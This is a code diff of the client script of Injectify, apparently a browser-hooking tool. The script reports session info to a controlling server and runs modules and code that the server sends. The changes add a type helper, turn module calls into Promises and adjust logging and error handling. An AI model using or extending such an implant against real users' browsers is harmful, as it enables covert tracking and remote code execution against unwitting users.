@@ -12,6 +12,32 @@ declare var require: any
 "function"!=typeof JSON.decycle&&(JSON.decycle=function(n,e){"use strict";var t=new WeakMap;return function n(c,o){var i,r;return void 0!==e&&(c=e(c)),"object"!=typeof c||null===c||c instanceof Boolean||c instanceof Date||c instanceof Number||c instanceof RegExp||c instanceof String?c:void 0!==(i=t.get(c))?{$ref:i}:(t.set(c,o),Array.isArray(c)?(r=[],c.forEach(function(e,t){r[t]=n(e,o+"["+t+"]")})):(r={},Object.keys(c).forEach(function(e){r[e]=n(c[e],o+"["+JSON.stringify(e)+"]")})),r)}(n,"$")});
 
 /**
+ * Returns a string-representation of a variables instance
+ */
+function instanceOf(string: any) {
+	try {
+		if (typeof string === 'undefined') {
+			return 'undefined'
+		} else if (typeof string === 'number') {
+			return 'number'
+		} else if (string === null) {
+			return 'null'
+		} else if (string.constructor) {
+			var type = string.constructor.toString()
+			if (!type) return typeof string
+			type = type.split(' ')[1]
+			if (!type) return typeof string
+			type = type.slice(0, -2).toLowerCase()
+			return type
+		} else {
+			return typeof string
+		}
+	} catch(e) {
+		return typeof string
+	}
+}
+
+/**
  * Injectify core API
  * @class
  */
@@ -106,9 +132,13 @@ window['injectify'] = class Injectify {
 		})
 	}
 	static result(message: any) {
+		let type = instanceOf(message)
 		injectify.send('l', {
 			type: 'return',
-			message: message
+			message: {
+				type: type,
+				data: message
+			}
 		})
 	}
 
@@ -139,24 +169,23 @@ window['injectify'] = class Injectify {
 		}
 	}
 
-	static module(name, params?: any, callback?: any, errorCallback?: any) {
-		let token = +new Date
-		/**
-		 * Parse the parameters
-		 */
-		if (typeof params === 'function') {
-			callback = params
-			if (typeof callback === 'function') window['e' + token] = callback
-		}
-		if (typeof callback === 'function') window[token] = callback
-		if (typeof errorCallback === 'function') window['e' + token] = errorCallback
-		/**
-		 * Emit to server
-		 */
-		this.send('module', {
-			name: name,
-			token: token,
-			params: params
+	static module(name: string, params?: any) {
+		// @ts-ignore
+		return new Promise((resolve, reject) => {
+			let token = +new Date
+			/**
+			 * Parse the parameters
+			 */
+			if (typeof resolve === 'function') window[token] = resolve
+			if (typeof reject === 'function') window['e' + token] = reject
+			/**
+			 * Emit to server
+			 */
+			this.send('module', {
+				name: name,
+				token: token,
+				params: params
+			})
 		})
 	}
 
@@ -253,7 +282,7 @@ window['injectify'] = class Injectify {
 
 	static sendSession() {
 		let sessionInfo = injectify.sessionInfo
-		if (this.debug) console.warn('🕵🏼 Delivered session info to server', sessionInfo)
+		if (this.debug) console.debug('🕵🏼 Delivered session info to server', sessionInfo)
 		this.send('i', sessionInfo)
 	}
 
@@ -325,7 +354,6 @@ window['injectify'] = class Injectify {
  */
 let injectify: typeof Injectify = window['injectify']
 
-
 // @ts-ignore
 let global = injectify.global
 window['global'] = global
@@ -368,6 +396,8 @@ injectify.listener((data, topic) => {
 				name: data.name,
 				token: data.token,
 				callback: window[data.token] || function() {}, // Fallback function if no callback was specified
+				resolve: window[data.token] || function() {},
+				reject: window[`e${data.token}`] || function() {},
 				returned: undefined,
 				config: {
 					async: false
@@ -398,8 +428,9 @@ injectify.listener((data, topic) => {
 				 * Delete it's synchronous callback
 				 */
 				return delete window[data.token]
-			} else if (injectify.debug && data.error.message) {
-				console.error('📦 ' + data.error.message, module)
+			} else {
+				if (data.error.message) injectify.error(`📦 ${data.error.message}`, module)
+				module.reject(data.error.message)
 			}
 		}
 		if (topic == 'execute') {
